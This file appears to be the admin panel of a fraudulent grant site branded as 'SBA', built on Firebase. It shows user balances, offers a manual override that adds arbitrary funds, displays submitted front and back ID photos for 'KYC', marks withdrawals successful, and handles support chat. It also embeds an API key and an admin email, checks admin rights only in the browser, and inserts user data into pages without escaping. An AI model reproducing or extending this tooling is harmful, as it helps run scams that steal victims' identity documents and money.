<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA MASTER | COMMAND UNIT V8</title>
    <style>
        body { background: #020617; color: #f8fafc; font-family: sans-serif; margin: 0; padding-bottom: 50px; }
        .admin-nav { background: #0f172a; padding: 20px; border-bottom: 4px solid #ef4444; text-align: center; position: sticky; top: 0; z-index: 1000; }
        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
        .section-title { font-size: 12px; color: #38bdf8; text-transform: uppercase; letter-spacing: 2px; margin: 40px 0 15px; border-left: 4px solid #ef4444; padding-left: 10px; font-weight: bold; }
        
        /* Dashboard Tables */
        .card { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 600px; }
        th { text-align: left; color: #94a3b8; padding: 12px; border-bottom: 1px solid #334155; }
        td { padding: 12px; border-bottom: 1px solid #0f172a; }

        /* Request Feed Styling */
        .req-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .req-item { background: #ffffff; color: #0f172a; padding: 20px; border-radius: 8px; border-left: 6px solid #f59e0b; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .view-btn { background: #38bdf8; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-size: 11px; font-weight: bold; display: inline-block; margin-right: 5px; }

        /* Chat Styling */
        .chat-card { background: #ffffff; color: #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
        .chat-history { height: 250px; overflow-y: auto; background: #f1f5f9; padding: 12px; border-radius: 6px; display: flex; flex-direction: column; gap: 10px; }
        .msg { max-width: 85%; padding: 10px; border-radius: 10px; font-size: 13px; word-wrap: break-word; line-height: 1.4; }
        .msg.admin { align-self: flex-end; background: #dcf8c6; border: 1px solid #b5e5a4; color: #14532d; }
        .msg.user { align-self: flex-start; background: #fff; border: 1px solid #cbd5e1; color: #1e293b; }

        /* Controls */
        input { background: #0f172a; border: 1px solid #334155; color: white; padding: 12px; border-radius: 6px; }
        .reply-box input { background: #fff; color: #000; border: 1px solid #ddd; flex: 1; }
        .action-btn { background: #10b981; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; }
        .decline-btn { background: #ef4444; }
    </style>
</head>
<body>

    <div class="admin-nav">
        <h1 style="font-size: 18px; margin: 0; letter-spacing: 2px;">SBA COMMAND UNIT | CORE V8</h1>
        <div id="adminEmail" style="font-size: 10px; color: #94a3b8; margin-top: 5px;">AUTHORIZING SYSTEM...</div>
    </div>

    <div class="container">
        
        <div class="section-title">Global User Database</div>
        <div class="card">
            <table>
                <thead>
                    <tr>
                        <th>FULL NAME</th>
                        <th>BALANCE</th>
                        <th>STATUS</th>
                        <th>UID (COPY FOR LEDGER)</th>
                    </tr>
                </thead>
                <tbody id="userList"></tbody>
            </table>
        </div>

        <div class="section-title">Manual Ledger Override</div>
        <div class="card" style="display: flex; gap: 10px; flex-wrap: wrap;">
            <input type="text" id="targetUid" placeholder="Paste User UID here..." style="flex: 2; min-width: 200px;">
            <input type="number" id="targetAmount" placeholder="Amount (e.g. 10000)" style="flex: 1; min-width: 150px;">
            <button onclick="updateBalance()" class="action-btn">UPDATE USER FUNDS</button>
        </div>

        <div class="section-title">Active Requests (KYC & Withdrawals)</div>
        <div id="requestFeed" class="req-grid"></div>

        <div class="section-title">Live Support Conversations</div>
        <div id="chatFeed"></div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, addDoc, serverTimestamp, doc, deleteDoc, updateDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (user && user.email === "liger4683@gmail.com") {
                document.getElementById('adminEmail').innerText = "AUTHORIZED AGENT: " + user.email.toUpperCase();
            } else { window.location.href = "index.html"; }
        });

        // 1. User List Table
        onSnapshot(collection(db, "users"), (snap) => {
            const list = document.getElementById('userList');
            list.innerHTML = "";
            snap.forEach(d => {
                const u = d.data();
                list.innerHTML += `
                    <tr>
                        <td style="color:#38bdf8; font-weight:bold;">${u.fullName || 'No Name'}</td>
                        <td style="color:#10b981; font-weight:bold;">$${u.balance || '0'}</td>
                        <td><span style="background:#0f172a; padding:4px 8px; border-radius:4px; font-size:10px;">${u.status || 'PENDING'}</span></td>
                        <td style="font-family:monospace; font-size:11px; color:#94a3b8;">${d.id}</td>
                    </tr>`;
            });
        });

        // 2. Manual Ledger Update
        window.updateBalance = async () => {
            const uid = document.getElementById('targetUid').value.trim();
            const amt = document.getElementById('targetAmount').value;
            if(!uid || !amt) return alert("Please provide UID and Amount.");
            
            const userRef = doc(db, "users", uid);
            const userSnap = await getDoc(userRef);
            
            if(userSnap.exists()){
                const currentBal = parseFloat(userSnap.data().balance || 0);
                const newTotal = currentBal + parseFloat(amt);
                await updateDoc(userRef, { balance: newTotal });
                alert("Success: User balance updated to $" + newTotal);
                document.getElementById('targetAmount').value = "";
            } else { alert("Error: User UID not found in database."); }
        };

        // 3. Request Processing (KYC & Withdrawal)
        onSnapshot(collection(db, "requests"), (snap) => {
            const feed = document.getElementById('requestFeed');
            feed.innerHTML = "";
            snap.forEach(d => {
                const r = d.data();
                feed.innerHTML += `
                    <div class="req-item">
                        <div style="font-size:10px; color:#64748b; margin-bottom:5px;">ID: ${d.id.substring(0,10)}</div>
                        <div style="font-weight:bold; color:#1e3a8a; font-size:16px;">${r.type}</div>
                        <div style="margin:10px 0; font-size:13px;"><b>User:</b> ${r.userName || 'Unknown'}</div>
                        <div style="font-size:18px; font-weight:900; color:#ef4444; margin-bottom:15px;">${r.amount ? '$'+r.amount : 'KYC VERIFY'}</div>
                        
                        ${r.frontId ? `
                            <div style="margin-bottom:15px;">
                                <a href="${r.frontId}" target="_blank" class="view-btn">VIEW FRONT ID</a>
                                <a href="${r.backId}" target="_blank" class="view-btn">VIEW BACK ID</a>
                            </div>
                        ` : ''}
                        
                        <div style="display:flex; gap:10px;">
                            <button onclick="processAction('${d.id}', '${r.userId}', 'approve', '${r.type}', '${r.amount}')" class="action-btn" style="flex:1;">APPROVE</button>
                            <button onclick="processAction('${d.id}', '${r.userId}', 'decline')" class="action-btn decline-btn" style="flex:1;">DECLINE</button>
                        </div>
                    </div>`;
            });
        });

        window.processAction = async (docId, uid, action, type, amt) => {
            const userRef = doc(db, "users", uid);
            if(action === 'approve') {
                await updateDoc(userRef, { status: (type === 'KYC' ? "IDENTITY VERIFIED" : "WITHDRAWAL SUCCESSFUL") });
                
                if(type === 'Withdrawal') {
                    const snap = await getDoc(userRef);
                    const newBal = parseFloat(snap.data().balance || 0) - parseFloat(amt);
                    await updateDoc(userRef, { balance: newBal });
                    
                    // Save to transaction history
                    await addDoc(collection(db, "transactions"), {
                        userId: uid, 
                        type: "Withdrawal", 
                        amount: amt, 
                        status: "Successful", 
                        date: new Date().toLocaleDateString()
                    });
                }
            } else {
                await updateDoc(userRef, { status: "REQUEST DECLINED - SEE SUPPORT" });
            }
            await deleteDoc(doc(db, "requests", docId));
            alert("Request Handled Successfully.");
        };

        // 4. Live Chat Support
        onSnapshot(query(collection(db, "support_tickets"), orderBy("timestamp", "asc")), (snapshot) => {
            const chatFeed = document.getElementById('chatFeed');
            const groups = {};
            snapshot.forEach(snap => {
                const data = snap.data();
                if (!groups[data.userId]) groups[data.userId] = { name: data.userName, msgs: [] };
                groups[data.userId].msgs.push(data);
            });

            chatFeed.innerHTML = "";
            for (const uid in groups) {
                const group = groups[uid];
                const card = document.createElement('div');
                card.className = "chat-card";
                card.innerHTML = `
                    <div style="font-weight:bold; font-size:13px; margin-bottom:10px; color:#1e3a8a; border-bottom:1px solid #eee; padding-bottom:5px;">
                        CLIENT: ${group.name.toUpperCase()}
                    </div>
                    <div class="chat-history" id="chat-${uid}"></div>
                    <div class="reply-box" style="margin-top:12px; display:flex; gap:8px;">
                        <input type="text" id="input-${uid}" placeholder="Type reply to ${group.name}...">
                        <button onclick="window.sendReply('${uid}', '${group.name}')" class="action-btn" style="padding:0 20px;">REPLY</button>
                    </div>`;

                const history = card.querySelector(`#chat-${uid}`);
                group.msgs.forEach(m => {
                    const mDiv = document.createElement('div');
                    mDiv.className = `msg ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                    mDiv.innerText = m.message; // Fixes design spill
                    history.appendChild(mDiv);
                });

                chatFeed.appendChild(card);
                history.scrollTop = history.scrollHeight;
            }
        });

        window.sendReply = async (uid, name) => {
            const input = document.getElementById(`input-${uid}`);
            const text = input.value.trim();
            if(!text) return;

            await addDoc(collection(db, "support_tickets"), {
                userId: uid, userName: name, message: text, sender: "ADMIN", timestamp: serverTimestamp()
            });
            input.value = "";
        };
    </script>
</body>
</html>
